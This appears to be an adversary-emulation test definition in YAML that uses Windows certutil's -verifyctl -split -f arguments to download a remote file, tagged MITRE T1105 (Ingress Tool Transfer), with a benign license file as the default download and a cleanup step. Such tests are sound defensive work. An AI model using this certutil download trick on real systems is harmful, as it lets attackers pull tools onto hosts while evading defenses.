api_version: "2.0"
name: certutil download (verifyctl)
description: |
    Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
args:
    - name: remote_file
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    - name: local_path
      type: path
      default: Atomic-license.txt
uuid: ffd492e3-0455-4518-9fb1-46527c9f241b
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: certutil-download-(verifyctl)
      inline: |
        $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
        New-Item -Path $datePath -ItemType Directory
        Set-Location $datePath
        certutil -verifyctl -split -f {{.Args.remote_file}}
        Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination {{.Args.local_path}} }
      executor: powershell
      cleanup:
        inline: |
            Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
        executor: powershell
